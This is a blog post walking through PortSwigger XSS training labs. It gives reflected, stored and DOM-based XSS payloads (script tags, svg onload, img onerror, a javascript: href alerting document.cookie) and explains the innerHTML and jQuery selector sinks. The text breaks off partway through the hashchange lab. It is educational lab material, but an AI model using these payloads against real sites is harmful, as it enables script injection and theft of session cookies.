
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
  
  <meta name="generator" content="Hexo 7.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  <meta name="theme-color" content="#f9fafb">
  
  <title>PortSwigger XSS - sleeper</title>

  
    <meta name="description" content="Cross-site scriptingLab: Reflected XSS into HTML context with nothing encoded This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, per">
<meta property="og:type" content="article">
<meta property="og:title" content="PortSwigger XSS">
<meta property="og:url" content="http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/index.html">
<meta property="og:site_name" content="sleeper">
<meta property="og:description" content="Cross-site scriptingLab: Reflected XSS into HTML context with nothing encoded This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, per">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082003744.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082132162.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091133543.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091228400.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091245929.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509092235316.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509121229662.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509131931256.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509131953679.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509132012316.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509132029779.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151305236.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151313093.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151321475.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151323985.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151335007.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509152342971.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509152347574.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509172335113.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509192238092.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509192243367.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509210024786.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509231206059.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509232235405.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509242111099.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509280022032.png">
<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510042021986.png">
<meta property="article:published_time" content="2025-09-07T21:38:47.652Z">
<meta property="article:modified_time" content="2025-10-16T20:13:44.572Z">
<meta property="article:author" content="she11f">
<meta property="article:tag" content="PortSwigger">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png">
  
  
  
  <meta name="keywords" content="PortSwigger,XSS">

  <!-- feed -->
  

  <link rel="stylesheet" href="/css/main.css?v=1.29.1">

  
    <link rel="shortcut icon" href="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image%2Ficon.svg">
  

  

  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200&display=swap" rel="stylesheet">
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/20251216230101200.JPG" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">sleeper</div><div class="sub normal cap">自由而全面的发展</div><div class="sub hover cap" style="opacity:0"> Stay hungry，Stay foolish</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/03/30/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK(1)/"><span class="title">windows 内网靶场 1</span></a><a class="item title" href="/2025/11/27/%E9%9D%B6%E5%9C%BA/PortSwigger/Business%20logic%20vulnerabilities/"><span class="title">PortSwigger Business logic vulnerabilities</span></a><a class="item title" href="/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/"><span class="title">PortSwigger Api Testing</span></a><a class="item title" href="/2025/11/06/%E9%9D%B6%E5%9C%BA/PortSwigger/XXE/"><span class="title">PortSwigger XXE</span></a><a class="item title" href="/2025/11/04/%E9%9D%B6%E5%9C%BA/PortSwigger/SSRF/"><span class="title">PortSwigger SSRF</span></a><a class="item title" href="/2025/10/30/%E9%9D%B6%E5%9C%BA/PortSwigger/Path%20traversal/"><span class="title">PortSwigger Path traversal</span></a><a class="item title" href="/2025/10/25/%E9%9D%B6%E5%9C%BA/PortSwigger/Access%20control/"><span class="title">PortSwigger Access control</span></a><a class="item title" href="/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"><span class="title">PortSwigger Authentication</span></a><a class="item title" href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/"><span class="title">PortSwigger Information Disclosure</span></a><a class="item title" href="/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><span class="title">PortSwigger XSS</span></a></div></widget>
</div>

</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/PortSwigger/">PortSwigger</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/PortSwigger/XSS/">XSS</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-09-07T21:38:47.652Z">2025-09-08</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-10-16T20:13:44.572Z">2025-10-16</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>PortSwigger XSS</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h1><h3 id="Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Reflected XSS into HTML context with nothing encoded"></a>Lab: Reflected XSS into HTML context with nothing encoded</h3><blockquote>
<p>This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.</p>
<p>To solve the lab, perform a cross-site scripting attack that calls the alert function.</p>
</blockquote>
<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Stored XSS into HTML context with nothing encoded"></a>Lab: Stored XSS into HTML context with nothing encoded</h3><blockquote>
<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.        </p>
<p>To solve this lab, submit a comment that calls the <code>alert</code> function when the blog post is viewed.        </p>
</blockquote>
<p>Open a block entry or post, scroll down to the comment section and type in my payload,and click at the back to blog link. And you can see we called the alert function. </p>
<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in document.write sink using source location.search"></a>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h3><blockquote>
<p>This lab contains a DOM-based cross-site scripting  vulnerability in the search query tracking functionality. It uses the  JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.        </p>
<p>To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.        </p>
</blockquote>
<p>Let’s access the lab,and type in the search line “she11f”,then click the search button.now right click and choose Inspect </p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png" alt="image-20250908200032425"></p>
<p>In the search bar look for the string “she11f”</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082003744.png" alt="image-20250908200343690"></p>
<p>You can see the string was placed inside a image source tag, now close the developer tools go back to the search bar and type in the following close string and tag and put in an svg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>OR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in innerHTML sink using source location.search"></a>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h3><blockquote>
<p>This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an <code>innerHTML</code> assignment, which changes the HTML contents of a <code>div</code> element, using data from <code>location.search</code>.        </p>
<p> To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.        </p>
</blockquote>
<p>这题跟上一题略微不同，上一题用的是 document.write. 这题插入dom用的是 innerHTML。**<code>innerHTML</code><strong>和</strong><code>document.writ</code>**的执行时机略有不同</p>
<ul>
<li><code>innerHTML</code>：无论页面是否加载完成，都可以调用，且只会修改目标元素的内容，<strong>不会影响整个文档结构</strong>。<br>即使页面已经加载完毕（DOM 已生成），调用 <code>innerHTML</code> 只会替换指定元素的内容，其他部分不受影响。</li>
<li><code>document.write</code><ul>
<li>如果在<strong>页面加载过程中</strong>（文档流未关闭时）调用，内容会被正常插入到文档流中，成为页面的一部分。</li>
<li>如果在<strong>页面加载完成后</strong>（文档流已关闭）调用，会<strong>清空当前页面的所有内容</strong>，重新创建一个新的文档流并写入内容（相当于覆盖整个页面）。<br>例：页面加载完成后执行 <code>document.write(&quot;hello&quot;)</code>，原页面内容会被全部清除，只显示 “hello”。</li>
</ul>
</li>
</ul>
<p>所以这里当我们尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 能看到确实写入DOM结构了，但是并没有执行，</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082132162.png" alt="image-20250908213217066"></p>
<ul>
<li><code>innerHTML</code>：设计用于修改已有 DOM 元素的内容，浏览器会对插入的 <code>&lt;script&gt;</code> 进行安全限制，避免动态插入的脚本意外执行（防止 XSS 风险扩散）。</li>
<li><code>document.write</code>：模拟页面初始加载时的 HTML 解析流程，完全遵循原始 HTML 的解析规则（包括执行 <code>&lt;script&gt;</code>），因此脚本会被正常执行。</li>
</ul>
<p>所以正是因为这种机制导致直接插入 js 脚本无法直接执行，但是 innerHTML 的安全限制无法阻止其他标签的事件属性中脚本的执行。</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h3><blockquote>
<p>​            This lab contains a DOM-based cross-site scripting  vulnerability in the submit feedback page. It uses the jQuery library’s <code>$</code> selector function to find an anchor element, and changes its <code>href</code> attribute using data from <code>location.search</code>.        </p>
<p>​            To solve this lab, make the “back” link alert <code>document.cookie</code>.        </p>
</blockquote>
<p>题目描述告诉我们，漏洞点再 feedback 页面，翻译一下就是</p>
<blockquote>
<p>这个实验包含一个基于 DOM 的跨站脚本漏洞，存在于提交反馈页面中。它使用 jQuery 库的<code>$</code>选择器函数查找一个锚点元素（即<code>&lt;a&gt;</code>标签），并利用来自<code>location.search</code>的数据修改该元素的<code>href</code>属性。</p>
<p>要解决这个实验，请让 “返回” 链接弹出<code>document.cookie</code>（即显示当前页面的 Cookie 信息）。</p>
</blockquote>
<p>我们来到 feedback 页面，一开始是 feedback?returnPath&#x3D;&#x2F;post，我们随便输入一个 she11f 回车后控制台搜一下 she11f</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;backLink&quot; href=&quot;she11f&quot;&gt;Back&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>也就是说 returnPath 这个参数直接被写入 href 里面了，所以我们就可以这样构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br><span class="line">// href 中使用 javascript: 作为协议前缀，这是一种特殊的 “伪协议”（非标准网络协议），其作用是：将 : 后面的内容当作 JavaScript 代码执行。</span><br></pre></td></tr></table></figure>



<p>然后再点击 back 就能触发 js 事件</p>
<h3 id="Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>Lab: DOM XSS in jQuery selector sink using a hashchange event</h3><blockquote>
<p>​            This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property.        </p>
<p>​            To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser.        </p>
<p>这个实验在首页存在一个基于 DOM 的跨站脚本漏洞。它使用 jQuery 的 $() 选择器函数来自动滚动到指定的帖子，而该帖子的标题是通过 location.hash 属性传递的。</p>
<p>要解决这个实验，请向受害者发送一个攻击 payload，使其浏览器执行 print () 函数（即触发打印功能）。</p>
</blockquote>
<p>说实话没看懂，后面油管看的教程。</p>
<p>题目描述说帖子标题是通过  location.hash 属性传递的，我们问问ai吧</p>
<blockquote>
<p><code>location.hash</code> 是 JavaScript 中用于获取或设置当前 URL 中 <strong><code>#</code> 后面部分</strong>的属性，也被称为 “哈希值” 或 “锚点”。</p>
</blockquote>
<p>f12看一下控制台源码，全局搜索一下   location.hash</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                           <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                           <span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">                       &#125;);</span><br></pre></td></tr></table></figure>

<p>有 $ 说明是 jQuery，这段代码绑定了一个 hashchange 监听器，当URL 中 <strong><code>#</code> 后面部分</strong>的属性变化时，就会匹配  <code>section.blog-list</code> 区域内的 <code>&lt;h2&gt;</code> 标签 ，我们找一下这些元素</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091133543.png" alt="image-20250909113304422"></p>
<p>其实就是每篇文章的标题，我们可以试一下在 url 后面拼接 <code>#Awkward Breakups</code> 会车发现直接滚动到 Awkward Breakups 标题位置这里了，我们控制台分别打印一下 <code>decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;21st Century Dreaming)&quot; </span><br></pre></td></tr></table></figure>

<p>这边因为 post 作用域是局部变量，所以控制台不好打印，我们直接打印 <code>$(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;) </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object &#123; 0: h2, selector: &quot;section.blog-list h2:contains(21st Century Dreaming)&quot;, length: 1, prevObject: &#123;…&#125;, context: HTMLDocument https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#21st%20Century%20Dreaming &#125;</span><br></pre></td></tr></table></figure>

<p>是一个对象，再打印一下 post.get[0],</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>所以跳转到标题的原理就是如此。</p>
<p>我们搜索一下 location.hash XSS,可以找到这篇文章 <a target="_blank" rel="noopener" href="https://bugs.jquery.com/ticket/9521/">https://bugs.jquery.com/ticket/9521/</a> ，里面有这样关键的一句话，</p>
<blockquote>
<p>“$(location.hash)” expected CSS selector in many case, but this code also can create html element.</p>
</blockquote>
<p>这句话的意思是 当 css 选择器找不到  <code>$(location.hash)</code> 中的哈希值（<code>#</code> 后的内容），jQuery 可能会将其解析为 HTML 标签并创建新的 DOM 元素。</p>
<p>也就是我们后面可以传递一个带有时间的 html 元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;img src=1&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到网络请求里返回了404状态码，说明img标签被解析了，只是找不到这个资源</p>
